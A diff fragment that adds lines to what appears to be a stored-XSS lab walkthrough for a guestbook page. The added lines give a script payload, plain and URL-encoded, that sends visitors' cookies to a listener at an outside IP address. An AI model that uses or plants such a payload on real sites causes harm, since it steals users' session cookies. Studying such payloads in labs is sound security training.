@@ -32,6 +32,12 @@ Payload:
 ```
 Will be stored in the database and **executed every time** someone views the guestbook.
 
+you can also use a listener check for incoming requests in the terminal when someone clicks on the stored XSS
+
+```payload: <script>new Image().src='http://192.168.1.7:1339/bogus.php?output='+document.cookie;</script>
+encoded payload: <script>new+Image().src%3d'http%3a//192.168.1.7%3a1339/bogus.php%3foutput%3d'%2bdocument.cookie%3b</script>
+```
+
 ---
 
 ### 🟡 Medium Security
